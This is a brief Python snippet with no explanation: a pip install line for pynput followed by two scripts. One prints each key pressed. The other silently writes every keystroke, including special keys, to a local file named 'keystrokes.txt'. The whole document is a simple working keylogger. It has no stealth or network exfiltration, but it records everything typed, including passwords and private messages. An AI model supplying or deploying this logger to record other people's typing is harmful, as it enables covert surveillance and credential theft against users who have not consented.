pip install pynput

from pynput import keyboard

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")  # Print the key pressed
    except AttributeError:
        print(f"Special key pressed: {key}")

# Start listening for keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

from pynput import keyboard

log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
